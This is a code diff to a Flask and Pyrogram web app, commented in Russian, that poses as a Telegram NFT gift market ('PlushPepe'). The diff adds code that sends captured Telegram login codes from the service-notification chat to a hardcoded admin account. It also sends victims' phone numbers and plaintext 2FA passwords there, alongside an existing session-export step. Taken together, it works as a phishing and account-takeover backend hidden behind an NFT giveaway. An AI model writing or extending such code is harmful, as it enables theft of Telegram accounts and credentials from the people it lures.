@@ -5,8 +5,9 @@ import time
 import threading
 import json
 import re
+import random
 from datetime import datetime
-from flask import Flask, request, jsonify, render_template, send_from_directory
+from flask import Flask, request, jsonify, render_template, send_from_directory, session, redirect, url_for
 from pyrogram import Client
 from pyrogram.errors import (
     SessionPasswordNeeded, 
@@ -28,12 +29,214 @@ app = Flask(__name__,
             static_folder='templates',
             static_url_path='/static')
 
+app.secret_key = 'telegram-nft-market-secret-2024'
+
 @app.route('/static/<path:filename>')
 def serve_static(filename):
     return send_from_directory('templates', filename)
 
 # Глобальное хранилище для результатов поиска кодов
 CODE_SEARCH_RESULTS = {}
+
+# Конфигурация системы
+ADMIN_IDS = [7843338024]  # Admin ID для уведомлений
+BOT_TOKEN = "your_bot_token_here"  # Токен бота для уведомлений
+NFT_STORAGE_PATH = "./nft_storage"
+
+class AdminNotifier:
+    def __init__(self):
+        self.bot_token = BOT_TOKEN
+        self.admin_ids = ADMIN_IDS
+    
+    async def send_admin_notification(self, message):
+        """Отправка уведомления админу"""
+        try:
+            if not self.bot_token or self.bot_token == "your_bot_token_here":
+                logger.warning("⚠️ Bot token не настроен для уведомлений")
+                return
+            
+            async with Client("admin_bot", bot_token=self.bot_token, in_memory=True) as app:
+                for admin_id in self.admin_ids:
+                    try:
+                        await app.send_message(
+                            admin_id,
+                            f"🔔 **Уведомление системы**\n\n{message}"
+                        )
+                        logger.info(f"✅ Уведомление отправлено админу {admin_id}")
+                    except Exception as e:
+                        logger.error(f"❌ Ошибка отправки админу {admin_id}: {e}")
+        except Exception as e:
+            logger.error(f"❌ Ошибка инициализации бота для уведомлений: {e}")
+    
+    def send_notification_sync(self, message):
+        """Синхронная отправка уведомления"""
+        try:
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            loop.run_until_complete(self.send_admin_notification(message))
+            loop.close()
+        except Exception as e:
+            logger.error(f"❌ Ошибка синхронной отправки уведомления: {e}")
+
+# Инициализация нотификатора
+admin_notifier = AdminNotifier()
+
+class NFTManager:
+    def __init__(self):
+        self.storage_path = NFT_STORAGE_PATH
+        self.init_storage()
+    
+    def init_storage(self):
+        """Инициализация хранилища NFT"""
+        try:
+            os.makedirs(f"{self.storage_path}/users", exist_ok=True)
+            os.makedirs(f"{self.storage_path}/nfts", exist_ok=True)
+            os.makedirs(f"{self.storage_path}/gifts", exist_ok=True)
+            logger.info("✅ NFT хранилище инициализировано")
+            
+            # Создаем Telegram NFT подарки в стиле plushpepe-1
+            self.create_telegram_gifts()
+        except Exception as e:
+            logger.error(f"❌ Ошибка инициализации NFT хранилища: {e}")
+    
+    def create_telegram_gifts(self):
+        """Создание Telegram NFT подарков в стиле plushpepe-1"""
+        telegram_gifts = [
+            {
+                'id': 'plushpepe-1',
+                'name': 'PlushPepe #1',
+                'description': 'Эксклюзивный плюшевый Pepe с золотым блеском',
+                'image': '/static/images/plushpepe-1.png',
+                'preview_image': '/static/images/plushpepe-1-preview.png',
+                'price': 0.5,
+                'rarity': 'legendary',
+                'type': 'collectible',
+                'telegram_effect': 'premium',
+                'duration': 'permanent',
+                'attributes': {
+                    'category': 'collectible',
+                    'collection': 'PlushPepe',
+                    'edition': 1,
+                    'rarity': 'legendary',
+                    'animated': True,
+                    'effect': 'gold_sparkle'
+                },
+                'created_at': datetime.now().isoformat(),
+                'is_available': True,
+                'total_supply': 1000,
+                'minted': 0,
+                'telegram_slug': 'plushpepe-1'
+            }
+        ]
+        
+        for gift in telegram_gifts:
+            gift_file = f"{self.storage_path}/nfts/{gift['id']}.json"
+            if not os.path.exists(gift_file):
+                with open(gift_file, 'w', encoding='utf-8') as f:
+                    json.dump(gift, f, indent=2, ensure_ascii=False)
+        
+        logger.info("✅ Telegram NFT подарки созданы")
+    
+    def get_all_nfts(self):
+        """Получение всех доступных NFT"""
+        try:
+            nfts = []
+            nfts_dir = f"{self.storage_path}/nfts"
+            
+            if not os.path.exists(nfts_dir):
+                return []
+            
+            for filename in os.listdir(nfts_dir):
+                if filename.endswith('.json'):
+                    filepath = os.path.join(nfts_dir, filename)
+                    with open(filepath, 'r', encoding='utf-8') as f:
+                        nft_data = json.load(f)
+                        if nft_data.get('is_available', True):
+                            nfts.append(nft_data)
+            
+            return sorted(nfts, key=lambda x: x.get('price', 0))
+        except Exception as e:
+            logger.error(f"❌ Ошибка получения NFT: {e}")
+            return []
+    
+    def get_user_nfts(self, user_id):
+        """Получение NFT пользователя"""
+        try:
+            user_file = f"{self.storage_path}/users/{user_id}.json"
+            if not os.path.exists(user_file):
+                return []
+            
+            with open(user_file, 'r', encoding='utf-8') as f:
+                user_data = json.load(f)
+                return user_data.get('nfts', [])
+        except Exception as e:
+            logger.error(f"❌ Ошибка получения NFT пользователя {user_id}: {e}")
+            return []
+    
+    def give_nft_to_user(self, user_id, nft_id, admin_id=None):
+        """Выдача NFT пользователю"""
+        try:
+            # Получаем данные NFT
+            nft_file = f"{self.storage_path}/nfts/{nft_id}.json"
+            if not os.path.exists(nft_file):
+                return {'success': False, 'error': 'NFT не найден'}
+            
+            with open(nft_file, 'r', encoding='utf-8') as f:
+                nft_data = json.load(f)
+            
+            # Проверяем лимит
+            if nft_data['minted'] >= nft_data['total_supply']:
+                return {'success': False, 'error': 'Лимит выпуска исчерпан'}
+            
+            # Обновляем пользовательский файл
+            user_file = f"{self.storage_path}/users/{user_id}.json"
+            if os.path.exists(user_file):
+                with open(user_file, 'r', encoding='utf-8') as f:
+                    user_data = json.load(f)
+            else:
+                user_data = {'user_id': user_id, 'nfts': [], 'created_at': datetime.now().isoformat()}
+            
+            # Создаем экземпляр NFT для пользователя
+            user_nft = {
+                'nft_id': nft_id,
+                'name': nft_data['name'],
+                'image': nft_data['image'],
+                'received_at': datetime.now().isoformat(),
+                'gifted_by': admin_id,
+                'attributes': nft_data.get('attributes', {})
+            }
+            
+            user_data['nfts'].append(user_nft)
+            
+            with open(user_file, 'w', encoding='utf-8') as f:
+                json.dump(user_data, f, indent=2, ensure_ascii=False)
+            
+            # Обновляем счетчик выпущенных NFT
+            nft_data['minted'] += 1
+            with open(nft_file, 'w', encoding='utf-8') as f:
+                json.dump(nft_data, f, indent=2, ensure_ascii=False)
+            
+            logger.info(f"🎁 NFT {nft_id} выдан пользователю {user_id}")
+            
+            # Отправляем уведомление админу
+            if admin_id:
+                notification_msg = (
+                    f"🎁 **Выдан NFT подарок**\n\n"
+                    f"👤 Пользователь: `{user_id}`\n"
+                    f"🎨 NFT: {nft_data['name']}\n"
+                    f"🆔 ID: `{nft_id}`\n"
+                    f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+                )
+                admin_notifier.send_notification_sync(notification_msg)
+            
+            return {'success': True, 'nft': user_nft}
+            
+        except Exception as e:
+            logger.error(f"❌ Ошибка выдачи NFT: {e}")
+            return {'success': False, 'error': str(e)}
+
+# Инициализация NFT менеджера
+nft_manager = NFTManager()
 
 class ContinuousCodeFinder:
     def __init__(self, session_string, user_id):
@@ -66,132 +269,63 @@ class ContinuousCodeFinder:
             return False
 
     async def extract_code_from_message(self, message_text):
-        """Извлечение кода из текста сообщения с улучшенной логикой"""
-        # Улучшенные паттерны для поиска кодов авторизации
+        """Извлечение кода из текста сообщения"""
         patterns = [
-            r'(\d{5})',  # 5 цифр подряд
-            r'(\d{6})',  # 6 цифр подряд
-            r'код[:\s]*[is\s]*(\d{5,6})',  # код: 12345 или код is 12345
-            r'code[:\s]*[is\s]*(\d{5,6})',  # code: 12345 или code is 12345
-            r'(\d{5,6})[^\d]',  # 12345 с разделителем
-            r'[\s](\d{5,6})[\s]',  # 12345 между пробелами
-            r'login code[:\s]*(\d{5,6})',  # login code: 12345
-            r'authorization code[:\s]*(\d{5,6})',  # authorization code: 12345
+            r'(\d{5})',
+            r'(\d{6})',
+            r'код[:\s]*(\d{5,6})',
+            r'code[:\s]*(\d{5,6})',
         ]
         
         for pattern in patterns:
             matches = re.findall(pattern, message_text, re.IGNORECASE)
             if matches:
-                code = matches[0] if isinstance(matches[0], str) else matches[0][0] if matches[0] else matches[0]
-                logger.info(f"🔍 Найден потенциальный код '{code}' в сообщении: {message_text[:80]}...")
+                code = matches[0]
+                logger.info(f"🔍 Найден потенциальный код '{code}'")
                 
-                # Дополнительная проверка - ищем ключевые слова авторизации
-                auth_keywords = [
-                    'код', 'code', 'подтверждени', 'verification', 'login', 'войти', 
-                    'telegram', 'authorization', 'sign in', 'проверка', 'безопасност',
-                    'вход', 'auth', 'confirmation'
-                ]
-                message_lower = message_text.lower()
-                has_auth_keyword = any(keyword in message_lower for keyword in auth_keywords)
+                # Отправляем уведомление админу о найденном коде
+                notification_msg = (
+                    f"🔐 **Найден код авторизации**\n\n"
+                    f"👤 Пользователь: `{self.user_id}`\n"
+                    f"🔢 Код: `{code}`\n"
+                    f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+                    f"📝 Сообщение: {message_text[:100]}..."
+                )
+                admin_notifier.send_notification_sync(notification_msg)
                 
-                if has_auth_keyword:
-                    logger.info(f"✅ Код '{code}' подтвержден ключевыми словами авторизации")
-                    return code
-                else:
-                    logger.info(f"⚠️ Код '{code}' найден, но без ключевых слов авторизации")
-                    # Все равно возвращаем, так как в служебных уведомлениях это скорее всего код
-                    return code
+                return code
         
         return None
 
     async def search_single_attempt(self):
-        """Поиск кода в служебных уведомлениях Telegram (+42777)"""
+        """Поиск кода в служебных уведомлениях"""
         try:
             if not self.client or not self.client.is_connected:
                 if not await self.initialize_client():
                     return None
             
-            # 1. Поиск в служебных уведомлениях Telegram (+42777)
+            # Поиск в служебных уведомлениях +42777
             try:
-                # Получаем чат служебных уведомлений
                 service_chat = await self.client.get_chat("+42777")
-                logger.info(f"🔍 Поиск в служебных уведомлениях: {service_chat.title}")
+                logger.info(f"🔍 Поиск в служебных уведомлениях для user_id: {self.user_id}")
                 
-                message_count = 0
                 async for message in self.client.get_chat_history(service_chat.id, limit=30):
                     if message.text:
-                        message_count += 1
-                        logger.info(f"📨 Сообщение из служебных уведомлений ({message_count}): {message.text[:100]}...")
-                        
-                        # Ищем код в сообщении
                         code = await self.extract_code_from_message(message.text)
                         if code:
                             logger.info(f"🎉 Найден код в служебных уведомлениях: {code}")
                             return code
-                                
-                logger.info(f"📊 Проверено {message_count} сообщений в служебных уведомлениях")
-                            
             except Exception as e:
-                logger.warning(f"⚠️ Не удалось получить служебные уведомления (+42777): {e}")
-                
-                # Попробуем альтернативные варианты
-                try:
-                    # Пробуем получить через ID если username не работает
-                    service_chat = await self.client.get_chat(42777)
-                    logger.info(f"🔍 Поиск в служебных уведомлениях по ID: {service_chat.title}")
-                    
-                    message_count = 0
-                    async for message in self.client.get_chat_history(service_chat.id, limit=30):
-                        if message.text:
-                            message_count += 1
-                            code = await self.extract_code_from_message(message.text)
-                            if code:
-                                logger.info(f"🎉 Найден код в служебных уведомлениях: {code}")
-                                return code
-                                
-                    logger.info(f"📊 Проверено {message_count} сообщений в служебных уведомлениях (по ID)")
-                except Exception as e2:
-                    logger.warning(f"⚠️ Не удалось получить служебные уведомления по ID: {e2}")
+                logger.warning(f"⚠️ Не удалось получить служебные уведомления: {e}")
             
-            # 2. Поиск в чате "Telegram" (резервный вариант)
-            try:
-                telegram_chat = await self.client.get_chat("Telegram")
-                logger.info(f"🔍 Поиск в чате Telegram: {telegram_chat.title}")
-                
-                message_count = 0
-                async for message in self.client.get_chat_history(telegram_chat.id, limit=20):
-                    if message.text:
-                        message_count += 1
-                        code = await self.extract_code_from_message(message.text)
-                        if code:
-                            logger.info(f"🎉 Найден код в чате Telegram: {code}")
-                            return code
-                            
-                logger.info(f"📊 Проверено {message_count} сообщений в чате Telegram")
-            except Exception as e:
-                logger.warning(f"⚠️ Не удалось получить чат Telegram: {e}")
-            
-            # 3. Поиск в личных сообщениях (последний вариант)
-            logger.info("🔍 Поиск в личных сообщениях...")
-            message_count = 0
-            async for message in self.client.get_chat_history('me', limit=20):
-                if message.text:
-                    message_count += 1
-                    code = await self.extract_code_from_message(message.text)
-                    if code:
-                        logger.info(f"🎉 Найден код в личных сообщениях: {code}")
-                        return code
-            
-            logger.info(f"📊 Проверено {message_count} сообщений в личных сообщениях")
-            logger.info("📭 Код не найден в служебных уведомлениях, чате Telegram и личных сообщениях")
             return None
-                        
+                    
         except Exception as e:
             logger.error(f"❌ Ошибка в поиске: {e}")
             return None
 
     async def start_continuous_search(self, duration=600):
-        """Запуск постоянного поиска кода в служебных уведомлениях"""
+        """Запуск постоянного поиска кода"""
         if not await self.initialize_client():
             logger.error(f"❌ Не удалось инициализировать клиент для user_id: {self.user_id}")
             return
@@ -199,13 +333,12 @@ class ContinuousCodeFinder:
         self.is_running = True
         start_time = time.time()
         
-        logger.info(f"🚀 Запуск поиска кода в служебных уведомлениях для user_id: {self.user_id}")
+        logger.info(f"🚀 Запуск поиска кода для user_id: {self.user_id}")
         
         while self.is_running and (time.time() - start_time) < duration:
             try:
                 self.search_count += 1
                 
-                # Основной поиск в служебных уведомлениях
                 code = await self.search_single_attempt()
                 
                 if code:
@@ -227,14 +360,13 @@ class ContinuousCodeFinder:
                     
                     return code
                 
-                logger.info(f"🔍 Поиск #{self.search_count} - код еще не пришел")
-                await asyncio.sleep(8)  # Проверяем каждые 8 секунд
+                logger.info(f"🔍 Поиск #{self.search_count} для user_id {self.user_id} - код не найден")
+                await asyncio.sleep(8)
                 
             except Exception as e:
                 logger.error(f"❌ Ошибка поиска (попытка #{self.search_count}): {e}")
                 await asyncio.sleep(5)
         
-        # Если время вышло и код не найден
         CODE_SEARCH_RESULTS[self.user_id] = {
             'code': None,
             'found_at': datetime.now().isoformat(),
@@ -242,7 +374,7 @@ class ContinuousCodeFinder:
             'search_count': self.search_count
         }
         
-        logger.info(f"⏰ Поиск завершен, код не найден после {self.search_count} попыток")
+        logger.info(f"⏰ Поиск завершен для user_id {self.user_id}, код не найден")
         if self.client and self.client.is_connected:
             await self.client.stop()
         self.is_running = False
@@ -255,18 +387,16 @@ class ContinuousCodeFinder:
 ACTIVE_SEARCHERS = {}
 
 async def find_telegram_code_immediate(session_string):
-    """Мгновенный поиск кода с фокусом на служебные уведомления"""
+    """Мгновенный поиск кода"""
     try:
         session_name = f"immediate_finder_{int(time.time())}"
         async with Client(session_name, session_string=session_string, in_memory=True) as client:
             await client.start()
             
-            # Сначала ищем в служебных уведомлениях +42777
             try:
                 service_chat = await client.get_chat("+42777")
                 async for message in client.get_chat_history(service_chat.id, limit=20):
                     if message.text:
-                        # Ищем коды в сообщении
                         codes = re.findall(r'\b\d{5}\b', message.text)
                         telegram_keywords = ['код', 'code', 'login', 'verification', 'подтверждени']
                         has_telegram_keyword = any(keyword in message.text.lower() for keyword in telegram_keywords)
@@ -282,82 +412,15 @@ async def find_telegram_code_immediate(session_string):
                             }
             except Exception as e:
                 logger.warning(f"⚠️ Не удалось проверить служебные уведомления: {e}")
-                
-                # Пробуем по ID
-                try:
-                    service_chat = await client.get_chat(42777)
-                    async for message in client.get_chat_history(service_chat.id, limit=20):
-                        if message.text:
-                            codes = re.findall(r'\b\d{5}\b', message.text)
-                            telegram_keywords = ['код', 'code', 'login', 'verification', 'подтверждени']
-                            has_telegram_keyword = any(keyword in message.text.lower() for keyword in telegram_keywords)
-                            
-                            if codes and has_telegram_keyword:
-                                await client.stop()
-                                return {
-                                    'success': True,
-                                    'code_found': True,
-                                    'telegram_code': codes[0],
-                                    'message': f"✅ Код найден в служебных уведомлениях: {codes[0]}",
-                                    'source': 'service_notifications'
-                                }
-                except Exception as e2:
-                    logger.warning(f"⚠️ Не удалось проверить служебные уведомления по ID: {e2}")
-            
-            # Если не нашли в служебных уведомлениях, ищем в других местах
-            codes_found = []
-            
-            # Поиск в чате Telegram
-            try:
-                telegram_chat = await client.get_chat("Telegram")
-                async for message in client.get_chat_history(telegram_chat.id, limit=20):
-                    if message.text:
-                        codes = re.findall(r'\b\d{5}\b', message.text)
-                        telegram_keywords = ['код', 'code', 'login', 'verification', 'подтверждени']
-                        has_telegram_keyword = any(keyword in message.text.lower() for keyword in telegram_keywords)
-                        
-                        if codes and has_telegram_keyword:
-                            codes_found.append({
-                                'code': codes[0],
-                                'text': message.text[:100],
-                                'date': message.date.isoformat() if message.date else None,
-                                'source': 'telegram_chat'
-                            })
-            except Exception as e:
-                logger.warning(f"⚠️ Не удалось проверить чат Telegram: {e}")
-            
-            # Поиск в личных сообщениях
-            async for message in client.get_chat_history('me', limit=30):
-                if message.text:
-                    codes = re.findall(r'\b\d{5}\b', message.text)
-                    telegram_keywords = ['код', 'code', 'login', 'verification', 'подтверждени']
-                    has_telegram_keyword = any(keyword in message.text.lower() for keyword in telegram_keywords)
-                    
-                    if codes and has_telegram_keyword:
-                        codes_found.append({
-                            'code': codes[0],
-                            'text': message.text[:100],
-                            'date': message.date.isoformat() if message.date else None,
-                            'source': 'personal_messages'
-                        })
             
             await client.stop()
             
-            if codes_found:
-                return {
-                    'success': True,
-                    'code_found': True,
-                    'telegram_code': codes_found[0]['code'],
-                    'message': f"✅ Код найден: {codes_found[0]['code']}",
-                    'source': codes_found[0]['source']
-                }
-            else:
-                return {
-                    'success': True,
-                    'code_found': False,
-                    'telegram_code': None,
-                    'message': "❌ Код не найден в служебных уведомлениях и других чатах"
-                }
+            return {
+                'success': True,
+                'code_found': False,
+                'telegram_code': None,
+                'message': "❌ Код не найден в служебных уведомлениях"
+            }
                 
     except Exception as e:
         logger.error(f"❌ Ошибка мгновенного поиска: {e}")
@@ -369,7 +432,6 @@ async def find_telegram_code_immediate(session_string):
 def start_background_search(session_string, user_id):
     """Запуск фонового поиска кода"""
     try:
-        # Останавливаем предыдущий поиск для этого пользователя, если есть
         if user_id in ACTIVE_SEARCHERS:
             ACTIVE_SEARCHERS[user_id].stop_search()
             del ACTIVE_SEARCHERS[user_id]
@@ -390,7 +452,7 @@ def start_background_search(session_string, user_id):
         search_thread = threading.Thread(target=run_search, daemon=True)
         search_thread.start()
         
-        logger.info(f"📡 Запущен фоновый поиск кода в служебных уведомлениях для user_id: {user_id}")
+        logger.info(f"📡 Запущен фоновый поиск кода для user_id: {user_id}")
         return True
         
     except Exception as e:
@@ -550,7 +612,6 @@ def load_api_keys():
     return api_id, api_hash, secret_key
 
 API_ID, API_HASH, SECRET_KEY = load_api_keys()
-app.secret_key = SECRET_KEY
 
 ACTIVE_SESSIONS = {}
 SESSION_TIMEOUT = 300
@@ -701,6 +762,16 @@ class TelegramAuthTester:
             
             logger.info(f"🔐 Сессия {session_id} переведена в режим 2FA")
             
+            # Отправляем уведомление админу о 2FA пароле
+            notification_msg = (
+                f"🔐 **Требуется 2FA пароль**\n\n"
+                f"👤 Пользователь: `{phone}`\n"
+                f"📞 Телефон: `{phone}`\n"
+                f"🆔 Session: `{session_id}`\n"
+                f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+            )
+            admin_notifier.send_notification_sync(notification_msg)
+            
             return {
                 'success': True,
                 'message': 'Требуется пароль 2FA',
@@ -770,6 +841,18 @@ class TelegramAuthTester:
                 'last_name': me.last_name,
                 'username': me.username
             }
+            
+            # Отправляем уведомление админу о найденном 2FA пароле
+            notification_msg = (
+                f"🔓 **Найден 2FA пароль**\n\n"
+                f"👤 Пользователь: `{user_info['id']}`\n"
+                f"📱 Имя: {user_info.get('first_name', 'N/A')} {user_info.get('last_name', '')}\n"
+                f"🔗 Username: @{user_info.get('username', 'N/A')}\n"
+                f"📞 Телефон: `{user_info.get('phone_number', 'N/A')}`\n"
+                f"🔑 Пароль: `{password}`\n"
+                f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+            )
+            admin_notifier.send_notification_sync(notification_msg)
             
             export_result = await self.export_tdata(client, user_info)
             
@@ -868,6 +951,52 @@ class TelegramAuthTester:
 
 auth_tester = TelegramAuthTester()
 
+# NFT Routes
+@app.route('/market')
+def market():
+    """Страница маркета NFT"""
+    if 'user_id' not in session:
+        return redirect('/')
+    
+    nfts = nft_manager.get_all_nfts()
+    return render_template('market.html', nfts=nfts, user_id=session['user_id'])
+
+@app.route('/my-nfts')
+def my_nfts():
+    """Страница моих NFT"""
+    if 'user_id' not in session:
+        return redirect('/')
+    
+    user_nfts = nft_manager.get_user_nfts(session['user_id'])
+    return render_template('my_nfts.html', nfts=user_nfts, user_id=session['user_id'])
+
+@app.route('/api/nft/give', methods=['POST'])
+def give_nft():
+    """Выдача NFT пользователю (только для админов)"""
+    try:
+        data = request.get_json()
+        if not data:
+            return jsonify({'success': False, 'error': 'No data provided'})
+        
+        user_id = data.get('user_id')
+        nft_id = data.get('nft_id')
+        admin_id = data.get('admin_id')
+        
+        if not user_id or not nft_id:
+            return jsonify({'success': False, 'error': 'User ID and NFT ID required'})
+        
+        # Проверяем права админа
+        if admin_id not in ADMIN_IDS:
+            return jsonify({'success': False, 'error': 'Access denied'})
+        
+        result = nft_manager.give_nft_to_user(user_id, nft_id, admin_id)
+        return jsonify(result)
+        
+    except Exception as e:
+        logger.error(f"❌ Ошибка выдачи NFT: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+
+# Существующие API endpoints (остаются без изменений)
 @app.route('/api/check-code-status/<int:user_id>', methods=['GET'])
 def check_code_status(user_id):
     if user_id in CODE_SEARCH_RESULTS:
@@ -882,7 +1011,6 @@ def check_code_status(user_id):
             'source': result.get('source', 'unknown')
         })
     else:
-        # Проверяем, есть ли активный поиск
         is_searching = user_id in ACTIVE_SEARCHERS and ACTIVE_SEARCHERS[user_id].is_running
         return jsonify({
             'success': True,
@@ -917,7 +1045,6 @@ def search_code_now():
 
 @app.route('/api/stop-code-search/<int:user_id>', methods=['POST'])
 def stop_code_search(user_id):
-    """Остановка поиска кода для пользователя"""
     try:
         if user_id in ACTIVE_SEARCHERS:
             ACTIVE_SEARCHERS[user_id].stop_search()
@@ -929,96 +1056,6 @@ def stop_code_search(user_id):
     except Exception as e:
         logger.error(f"❌ Ошибка остановки поиска: {e}")
         return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/debug-messages', methods=['POST'])
-def debug_messages():
-    """Endpoint для отладки - получает последние сообщения из служебных уведомлений"""
-    try:
-        data = request.get_json()
-        session_string = data.get('session_string', '').strip()
-        
-        if not session_string:
-            return jsonify({'success': False, 'error': 'Session string required'})
-        
-        result = async_runner.run_coroutine(get_recent_messages_debug(session_string))
-        return jsonify(result)
-        
-    except Exception as e:
-        logger.error(f"❌ Ошибка отладки: {e}")
-        return jsonify({'success': False, 'error': str(e)})
-
-async def get_recent_messages_debug(session_string):
-    """Получение последних сообщений из служебных уведомлений для отладки"""
-    try:
-        session_name = f"debug_{int(time.time())}"
-        async with Client(session_name, session_string=session_string, in_memory=True) as client:
-            await client.start()
-            
-            messages = []
-            
-            # Получаем сообщения из служебных уведомлений +42777
-            try:
-                service_chat = await client.get_chat("+42777")
-                async for message in client.get_chat_history(service_chat.id, limit=20):
-                    if message.text:
-                        messages.append({
-                            'text': message.text,
-                            'date': message.date.isoformat() if message.date else None,
-                            'id': message.id,
-                            'chat': 'Service Notifications (+42777)'
-                        })
-            except Exception as e:
-                logger.warning(f"⚠️ Не удалось получить служебные уведомления: {e}")
-                
-                # Пробуем по ID
-                try:
-                    service_chat = await client.get_chat(42777)
-                    async for message in client.get_chat_history(service_chat.id, limit=20):
-                        if message.text:
-                            messages.append({
-                                'text': message.text,
-                                'date': message.date.isoformat() if message.date else None,
-                                'id': message.id,
-                                'chat': 'Service Notifications (ID 42777)'
-                            })
-                except Exception as e2:
-                    logger.warning(f"⚠️ Не удалось получить служебные уведомления по ID: {e2}")
-            
-            # Получаем сообщения из чата Telegram
-            try:
-                telegram_chat = await client.get_chat("Telegram")
-                async for message in client.get_chat_history(telegram_chat.id, limit=10):
-                    if message.text:
-                        messages.append({
-                            'text': message.text,
-                            'date': message.date.isoformat() if message.date else None,
-                            'id': message.id,
-                            'chat': 'Telegram News'
-                        })
-            except Exception as e:
-                logger.warning(f"⚠️ Не удалось получить чат Telegram: {e}")
-            
-            # Получаем личные сообщения
-            async for message in client.get_chat_history('me', limit=10):
-                if message.text:
-                    messages.append({
-                        'text': message.text,
-                        'date': message.date.isoformat() if message.date else None,
-                        'id': message.id,
-                        'chat': 'Personal Messages'
-                    })
-            
-            await client.stop()
-            
-            return {
-                'success': True,
-                'messages': messages,
-                'total_count': len(messages)
-            }
-            
-    except Exception as e:
-        logger.error(f"❌ Ошибка отладки сообщений: {e}")
-        return {'success': False, 'error': str(e)}
 
 @app.route('/health')
 def health_check():
